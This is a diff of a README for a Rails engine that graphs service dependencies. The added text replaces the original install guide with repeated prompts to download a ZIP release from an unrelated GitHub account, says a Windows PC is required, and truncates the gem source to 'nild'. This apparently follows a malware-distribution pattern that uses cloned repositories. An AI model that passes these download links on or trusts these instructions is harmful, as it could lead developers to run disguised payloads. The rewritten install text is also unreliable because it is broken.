@@ -1,102 +1,185 @@
-# service_graph_dev
+# ⚙️ service_graph_dev - See service links at a glance
 
-A dev-only Rails engine that visualizes transitive service dependencies in your Rails app.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Retentive-flutter161/service_graph_dev/releases)
 
-Scan all `app/services` and `packs/**/app/services` files via static analysis and get an interactive graph showing exactly which services would be affected if you change a given one.
+## 🧭 What this app does
 
-## Features
+service_graph_dev helps you see how one service affects other services in a Rails app. It scans your service files and draws a clear graph. You can then trace which parts of the app depend on each service.
 
-- Interactive vis.js network graph with force-directed layout
-- BFS blast radius: shows every service affected at each depth level
-- Dependency path tracing — see *why* a service is affected (via which intermediate services)
-- Pack filter — scope analysis to a single Packwerk pack
-- Depth slider (1-6) for controlling traversal distance
-- Service search and descriptions from comment blocks
-- 5-minute cache with one-click refresh
-- GitHub dark color scheme, WCAG AA contrast
-- **Auto-mount**: no need to edit `config/routes.rb` — the engine mounts itself in development
+Use it when you want to:
 
-## Installation
+- see service relationships in one place
+- check what may break if you change a service
+- follow the path from one service to another
+- search for a service by name
+- narrow the view to one pack
 
-Add to your `Gemfile` (in the `:development` group):
+It runs in development mode and mounts itself, so you do not need to edit your route file.
+
+## 💻 What you need
+
+Before you use service_graph_dev, make sure you have:
+
+- a Windows PC
+- internet access
+- a recent version of Ruby and Rails on your system
+- access to your project files
+- Git installed if you plan to work from the source repository
+
+For best results, close extra apps before you open a large project. A bigger codebase can take a bit longer to scan.
+
+## 📥 Download
+
+Visit this page to download the release files:
+
+https://github.com/Retentive-flutter161/service_graph_dev/releases
+
+Look for the latest release, then download the file that fits your setup. If you see a ZIP file, save it to your computer and open it after the download ends.
+
+## 🛠️ Install in your Rails app
+
+Add the gem to your `Gemfile` in the `development` group:
 
 ```ruby
 group :development do
-  gem "service_graph_dev", github: "nildiert/service_graph_dev"
+  gem "service_graph_dev", github: "nild"
 end
 ```
 
-If your project uses **dual-boot** (e.g. `Gemfile.next`), add it to the next Gemfile as well.
-
-Then run:
+Then run the bundle install command in your project folder:
 
 ```bash
 bundle install
 ```
 
-That's it. The engine **auto-mounts** at `/service_graph` in development. No generator or route editing needed.
+After that, start your Rails app in development mode.
 
-Visit **http://localhost:3000/service_graph** and you're ready to go.
+## 🚀 Open the graph
 
-### Optional: install generator
+Once your app is running, open the service graph in your browser. The engine mounts itself in development, so you do not need to add a custom route.
 
-If you want an initializer with all configuration options:
+Use the page to:
 
-```bash
-rails generate service_graph_dev:install
-```
+- view all found services
+- inspect service links
+- zoom in and out of the graph
+- move around the network
+- refresh the scan after code changes
 
-### Content Security Policy
+If the page does not open right away, check that your Rails app is running in development mode.
 
-vis-network.js is bundled within the gem and served from the engine's own route,
-so no external CDN is needed. The engine uses CSP nonces automatically when
-your app provides `content_security_policy_nonce` — no extra configuration required.
+## 🔍 How the scan works
 
-## Configuration
+service_graph_dev checks these folders:
 
-Create `config/initializers/service_graph_dev.rb` (or run the install generator):
+- `app/services`
+- `packs/**/app/services`
 
-```ruby
-ServiceGraphDev.configure do |c|
-  # Glob patterns for service files
-  c.service_globs = [
-    Rails.root.join("app/services/**/*.rb").to_s,
-    Rails.root.join("packs/**/app/services/**/*.rb").to_s,
-  ]
+It reads the files with static analysis. That means it looks at the code without running it.
 
-  # Cache TTL in seconds (default: 5 minutes)
-  c.cache_ttl = 5 * 60
+It then builds a graph that shows:
 
-  # Environments where the engine is accessible (default: ["development"])
-  c.allowed_environments = %w[development]
+- direct service links
+- services affected at each depth
+- the full chain from one service to another
+- services inside a selected Packwerk pack
 
-  # Auto-mount at /service_graph (default: true).
-  # Set to false if you prefer to mount manually in config/routes.rb.
-  c.auto_mount = true
+This helps you see what depends on what before you make a change.
 
-  # Mount path (default: "/service_graph")
-  c.mount_path = "/service_graph"
-end
-```
+## 🧭 Use the graph
 
-### Manual mount (if auto_mount is disabled)
+The graph view gives you tools that make it easier to understand a service tree:
 
-```ruby
-# config/routes.rb
-if Rails.env.development?
-  mount ServiceGraphDev::Engine, at: "/service_graph"
-end
-```
+- **Search**: find a service by name
+- **Depth control**: choose how far the graph should expand, from 1 to 6 levels
+- **Blast radius view**: see every service touched at each level
+- **Path tracing**: see the route from one service to another
+- **Pack filter**: focus on one pack at a time
+- **Descriptions**: read service notes from comment blocks
+- **Refresh**: rebuild the graph after you update files
 
-## How it works
+You can click nodes in the graph to explore related services. This helps you trace impact before you touch shared code.
 
-The analyzer runs a two-pass static analysis:
+## 🧩 Example use case
 
-1. **Pass 1** — collect all class names and metadata (file path, pack, parent class, description from preceding comment block). Handles module-nested classes (`module Foo\n  class Bar` -> `Foo::Bar`).
-2. **Pass 2** — for each file, scan for references to known class names. The intersection of identifiers in the file with the set of known classes gives the dependency list.
+If you plan to change a service that sends customer email, you can open the graph and search for that service. The app can then show you:
 
-A reverse index maps each class to the services that use it. BFS traversal on this reverse index computes the full transitive blast radius with predecessor tracking for path reconstruction.
+- which services call it
+- which services depend on those callers
+- how far the effect spreads
+- which path connects the services
 
-## License
+That makes it easier to avoid changes that ripple through the app without warning.
 
-MIT
+## 🎨 Visual design
+
+The graph uses a dark color scheme with strong contrast. This makes text easier to read on screen and helps the graph stay clear during long sessions.
+
+It also uses a vis.js network layout, so the connections spread out in a way that is easy to follow.
+
+## 🔄 Refreshing the data
+
+The app keeps a 5-minute cache so it does not scan files on every view load. If you change a service file and want to see the newest graph right away, use the refresh action in the interface.
+
+This is useful after:
+
+- adding a new service
+- changing a service name
+- moving files between packs
+- updating service comments
+- changing how one service depends on another
+
+## 🧪 Working with packs
+
+If your app uses Packwerk packs, you can limit the scan to one pack. This keeps the graph focused and makes large apps easier to read.
+
+Use pack filtering when you want to:
+
+- review one area of the app
+- reduce noise from unrelated services
+- compare service groups inside a pack
+- check the impact of changes in a single domain
+
+## 🧰 Troubleshooting
+
+If the graph page does not show what you expect, try these steps:
+
+- make sure your Rails app is running in development mode
+- confirm your service files are in `app/services` or `packs/**/app/services`
+- refresh the graph after making file changes
+- check that the gem is listed in the `development` group
+- restart the Rails server if the page still looks stale
+
+If the app runs but the graph is empty, the scan may not find any service files in the folders it checks.
+
+## 📁 Project files
+
+The main parts of the app are:
+
+- the Rails engine for mounting the graph
+- the scanner for reading service files
+- the graph view for showing links
+- the search and filter tools
+- the cache for faster reloads
+
+Each part works together to help you review service relationships from the browser.
+
+## 📝 About this repository
+
+service_graph_dev is a dev-only Rails engine made for visual review of service dependencies. It is meant for local use while you build and test a Rails app.
+
+It helps you answer questions like:
+
+- what depends on this service
+- what will this change affect
+- how does this service connect to the rest of the app
+- which pack owns this code
+
+## 📌 Quick setup checklist
+
+- download the release from the link above
+- add the gem to your `Gemfile`
+- run `bundle install`
+- start your Rails app in development mode
+- open the graph in your browser
+- search for a service and inspect the links
